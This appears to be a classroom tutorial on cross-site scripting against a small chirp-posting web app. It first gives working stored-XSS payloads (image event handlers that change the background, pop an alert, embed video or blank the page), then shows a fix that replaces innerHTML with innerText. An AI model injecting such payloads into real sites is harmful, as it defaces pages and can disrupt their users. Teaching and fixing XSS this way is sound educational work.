# XSS Tutorial

### 1. Use XSS to change the behaviour of the site.
- Write the following comment:
```html
<img 
    src="https://images.wallpaperscraft.com/image/single/husky_puppies_couple_leisure_52671_1920x1200.jpg" 
    onmouseover="document.body.style.backgroundImage = \'url(https://media.tenor.com/IvyuPtEfzhoAAAAC/matrix.gif)\'">
```

----

- Change the background
```html
<img src="https://media.tenor.com/IvyuPtEfzhoAAAAC/matrix.gif" onload="document.body.style.backgroundImage = \'url(https://media.tenor.com/IvyuPtEfzhoAAAAC/matrix.gif)\'">
```

- Register a user with a name that is an image
> Write it into the username field of the register form
```html
username<img src="https://images.wallpaperscraft.com/image/single/husky_puppies_couple_leisure_52671_1920x1200.jpg" onmouseover="window.alert(\'NOW YOU ARE HACKED MUAHAHA!\')">
```

- Display a video
```html
<iframe 
    width="560"
    height="315" 
    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"
    frameborder="0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>
```

- Remove the content
> You need to restart the application afterwards
```html
<img src="https://images.wallpaperscraft.com/image/single/husky_puppies_couple_leisure_52671_1920x1200.jpg" onload="document.body.innerHTML = \'\'">
```

<br/>

### 2. Repair the application, so that it is not possible to use XSS.
- file: [frontend/src/js/auth-check.js](../frontend/src/js/auth-check.js)
- change the code at line 24
> `innerText` escapes the given input

current code:
```python 
 document.querySelector('.email').innerHTML = data.username;
```

replace with the following code:
```python 
 document.querySelector('.email').innerText = data.username;
```

-----

- file: [frontend/src/js/chirp.js](../frontend/src/js/chirp.js)
- the method beginning at line 63 needs to be changed
> Instead of creating a string the html elemnts are created separately and `innerText` is used to escape the input

current code:
```python 
function addChirp(item, atTop = false) {
    let text = `
    <li class="flex flex-row gap-2 shadow-sm rounded-xl p-3 bg-white">
        <div>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <path
                    d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z">
                </path>
            </svg>
        </div>
        <div class="flex flex-col gap-1">
            <div class="text-sm text-gray-400">
                ${item.username} &ctdot; ${item.created_at}
            </div>
            <div>
                ${item.content}
            </div>
        </div>
    </li>
    `;
    
    if (atTop) {
        chirpsList.innerHTML = text + chirpsList.innerHTML;
    } else {
        chirpsList.innerHTML += text;
    }
}
```

replace with the following code:
```python
function addChirp(item, atTop = false) {
    let listItem = document.createElement("li");
    listItem.classList.add("flex", "flex-row", "gap-2", "shadow-sm", "rounded-xl", "p-3", "bg-white");
    // We can safely append html here, because there is no user input
    listItem.innerHTML = `
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                    stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                    <path
                        d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z">
                    </path>
                </svg>
            </div>`;
    
    // Create a container for user input
    let container = document.createElement("div");
    container.classList.add("flex", "flex-col", "gap-1", "content")

    // create new childs for elements where user content will be placed:
    let usernameAndTimeRow = document.createElement("div");
    usernameAndTimeRow.classList.add("text-sm", "text-gray-400"); // Add classes for styling
    usernameAndTimeRow.innerText = `${item.username} ⋯ ${item.created_at}` // safely insert username and timestamp into element
    
    let contentRow = document.createElement("div");
    contentRow.innerText = item.content; // safely insert chirp content into element

    container.append(usernameAndTimeRow, contentRow) // Insert both elements into boostrapped template
    listItem.append(container);
    
    if (atTop) {
        chirpsList.prepend(listItem); // Add new chrip at top
    } else {
        chirpsList.append(listItem); // Add new chirp at bottom
    }
}
```
